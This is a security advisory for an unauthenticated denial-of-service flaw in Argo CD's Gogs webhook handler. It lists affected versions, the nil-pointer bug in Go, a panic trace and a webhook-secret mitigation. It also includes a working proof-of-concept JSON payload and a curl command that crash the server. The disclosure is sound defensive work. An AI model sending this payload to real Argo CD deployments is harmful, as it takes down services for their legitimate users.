# argo-cd vulnerable unauthenticated DoS via malformed Gogs webhook payload

**GHSA**: GHSA-wp4p-9pxh-cgx2 | **CVE**: CVE-2025-59537 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-20, CWE-476

**Affected Packages**:
- **github.com/argoproj/argo-cd** (go): >= 1.2.0, <= 1.8.7
- **github.com/argoproj/argo-cd/v2** (go): >= 2.0.0-rc1, <= 2.14.19
- **github.com/argoproj/argo-cd/v3** (go): = 3.2.0-rc1
- **github.com/argoproj/argo-cd/v3** (go): >= 3.1.0-rc1, <= 3.1.7
- **github.com/argoproj/argo-cd/v3** (go): >= 3.0.0-rc1, <= 3.0.18

## Description

### Summary

Unpatched Argo CD versions are vulnerable to malicious API requests which can crash the API server and cause denial of service to legitimate clients. 

With the default configuration, no `webhook.gogs.secret` set, Argo CD’s /api/webhook endpoint will crash the entire argocd-server process when it receives a Gogs push event whose JSON field `commits[].repo` is not set or is null.

### Details

Users can access `/api/webhook` without authentication, and when accessing this endpoint, the `Handler` function parses webhook type messages according to the `header (e.g. X-Gogs-Event)` and `body` parameters provided by the user. The `Parse` function simply unmarshals JSON-type messages. In other words, it returns a data structure even if the data structure is not exactly matched.

The `affectedRevisionInfo` function parses data according to webhook event types(e.g. `gogsclient.PushPayload`). However, due to the lack of data structure validation corresponding to these events, an attacker can cause a Denial of Service (DoS) attack by sending maliciously crafted data. because of Repository is Pointer Type.

```go
func affectedRevisionInfo(payloadIf any) (webURLs []string, revision string, change changeInfo, touchedHead bool, changedFiles []string) {
    switch payload := payloadIf.(type) {
        // ...
        case gogsclient.PushPayload:
            webURLs = append(webURLs, payload.Repo.HTMLURL) // bug
            // ...
        }
    return webURLs, revision, change, touchedHead, changedFiles
}

```
### PoC

payload-gogs.json

```json
{
  "ref": "refs/heads/master",
  "before": "0000000000000000000000000000000000000000",
  "after": "0a05129851238652bf806a400af89fa974ade739",
  "commits": [{}]
}
```

```shell
curl -k -v https://argocd.example.com/api/webhook \
  -H 'X-Gogs-Event: push' \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/payload-gogs.json
```

An attacker can cause a DoS and make the argo-cd service unavailable by continuously sending unauthenticated requests to `/api/webhook`.

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x68 pc=0x280f494]

goroutine 302 [running]:
github.com/argoproj/argo-cd/v2/util/webhook.affectedRevisionInfo({0x3bd8240?, 0x40005a7030?})
	/go/src/github.com/argoproj/argo-cd/util/webhook/webhook.go:233 +0x594
github.com/argoproj/argo-cd/v2/util/webhook.(*ArgoCDWebhookHandler).HandleEvent(0x40000f9140, {0x3bd8240?, 0x40005a7030?})
	/go/src/github.com/argoproj/argo-cd/util/webhook/webhook.go:254 +0x38
github.com/argoproj/argo-cd/v2/util/webhook.(*ArgoCDWebhookHandler).startWorkerPool.func1()
	/go/src/github.com/argoproj/argo-cd/util/webhook/webhook.go:128 +0x60
created by github.com/argoproj/argo-cd/v2/util/webhook.(*ArgoCDWebhookHandler).startWorkerPool in goroutine 1
	/go/src/github.com/argoproj/argo-cd/util/webhook/webhook.go:121 +0x28
```

### Mitigation

If you use Gogs and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.

If you do not use Gogs, you can set the webhook secret to a long, random value to effectively disable webhook handling for Gogs payloads.

```diff
apiVersion: v1
kind: Secret
metadata:
  name: argocd-secret
type: Opaque
data:
+  webhook.gogs.secret: <your base64-encoded secret here>
```

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

### Credit

Sangjun Song (s0ngsari) at Theori (theori.io)
